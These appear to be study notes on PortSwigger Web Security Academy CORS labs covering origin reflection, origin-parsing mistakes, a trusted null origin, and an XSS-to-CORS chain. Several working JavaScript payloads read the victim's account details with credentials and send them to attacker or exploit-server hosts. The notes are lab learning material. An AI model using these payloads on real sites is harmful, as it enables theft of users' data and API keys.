### Lab: CORS vulnerability with basic origin reflection
Some server may reflect origin in the response. i.e. if the req contains:
```
Origin: http://any.com
```
The response will contain the same origin as allowed if the server is configured to reflect origin:
```
Access-Control-Allow-Origin: http://any.com
```
If you can get user to click on the link that leads to your own website, and your own website contains the following script:
```
<script>
// both ways work

// var req = new XMLHttpRequest();
// req.onload = reqListener;
// req.open('get','https://0a9e001a04a2ac888bbfc28d00bf0063.web-security-academy.net/accountDetails',true);
// req.withCredentials = true;
// req.send();
// 
// function reqListener() {
//     console.log("in resp")
// //	location='//malicious-website.com/log?key='+this.responseText;
//     console.log(this.responseText)
// };

async function req() {
    const res = await fetch("https://vulnerable-website/accountDetails", {
        credentials: 'include',
    })
    const json = await res.text()

    window.location = 'https://your-server/exploit?key='+json
}
req()
</script>
```
Then you can make a request to that another website on behalf of the user


### Errors parsing Origin headers
Mistakes often arise when implementing CORS origin whitelists. Some organizations decide to allow access from all their subdomains (including future subdomains not yet in existence). And some applications allow access from various other organizations' domains including their subdomains. These rules are often implemented by matching URL prefixes or suffixes, or using regular expressions. Any mistakes in the implementation can lead to access being granted to unintended external domains.

For example, suppose an application grants access to all domains ending in:
```
normal-website.com
```
An attacker might be able to gain access by registering the domain:
```
hackersnormal-website.com
```
Alternatively, suppose an application grants access to all domains beginning with
```
normal-website.com
```
An attacker might be able to gain access using the domain:
```
normal-website.com.evil-user.net
```

### Whitelisted null origin value
### Lab: CORS vulnerability with trusted null origin
The specification for the Origin header supports the value null. Browsers might send the value null in the Origin header in various unusual situations:
- Cross-origin redirects.
- Requests from serialized data.
- Request using the file: protocol.
- Sandboxed cross-origin requests.

Some applications might whitelist the `null` origin to support local development of the application. 

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:
```
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0ab8005504188db084705016001f0098.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
       location='https://exploit-0a99002204538de184ea4f6d0136005b.exploit-server.net/exploit?key='+encodeURIComponent(this.responseText);
</script>"></iframe>
```

### Lab: CORS vulnerability with trusted insecure protocols
This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol
To solve the lab retrieve the administrator's API key (`GET /accountDetails` endpoint replies back the API key)

So we need a way of stealing admin's API key.
- The response to /accountDetails contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
- Send the request to Burp Repeater, and resubmit it with the added header Origin: http://subdomain.0a5a00e503089526801a213200ac0073.web-security-academy.net 
(Don't forget `http` or `https`. If you specify: `subdomain.0a5a00e503089526801a213200ac0073.web-security-academy.net` you're not gonna get `Access-Control-Allow-Origin` header in response)
- Since the origin is reflected in the Access-Control-Allow-Origin header, it confirms that the CORS configuration allows access from arbitrary subdomains, both HTTPS and HTTP.

After looking through the website's html, a subdomain was found (in the check stock req):
```bash
http://stock.lab-id.web-security-academy.net/?productId=1&storeId=1
```
After playing around with the endpoint we see that the `productID` is vulnerable to XSS.
e.g. if we send:
```bash
GET /?productId=4<script>alert(33)</script>&storeId=1 HTTP/2
Host: stock.0a5a00e503089526801a213200ac0073.web-security-academy.net
```
Here's the response that we get back:
```bash
HTTP/2 400 Bad Request
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 61

<h4>ERROR</h4>Invalid product ID: 4<script>alert(33)</script>
```
In the browser the response from above creates a `<script>` tab and executes js code.

So we try to make the victim make a request to `/accountDetails`, but we do it via subdomain, because we don't want CORS to stand on our way:
```bash
<script>
    document.location="http://stock.0a5a00e503089526801a213200ac0073.web-security-academy.net/?productId=4<script>const req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5a00e503089526801a213200ac0073.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a9000fb03cd95ce8034206201520055.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

